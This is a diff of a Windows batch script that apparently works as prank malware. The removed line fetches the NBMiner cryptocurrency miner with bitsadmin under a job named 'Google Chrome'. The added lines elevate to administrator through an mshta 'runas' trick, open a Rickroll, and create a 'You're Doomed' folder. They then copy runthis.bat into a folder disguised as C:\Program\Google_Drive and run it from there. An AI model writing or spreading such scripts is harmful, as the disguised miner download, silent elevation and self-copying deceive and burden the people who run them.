@@ -1,3 +1,20 @@
-@ECHO OFF
+@echo off
+%1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&&exit
+cd /d "%~dp0"
 
-bitsadmin.exe /transfer "Google Chrome" https://github.com/NebuTech/NBMiner/releases/download/v39.2/NBMiner_39.2_Win.zip D:\test\NBMiner_39.2_Win.zip
+
+
+start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ
+
+mkdir "You're Doomed"
+
+cd C:\
+
+mkdir C:\Program\Google_Drive\
+
+COPY C:\Users\%USERNAME%\Downloads\runthis.bat C:\Program\Google_Drive\runthis.bat
+
+start C:\Program\Google_Drive\runthis.bat
+
+
+pause
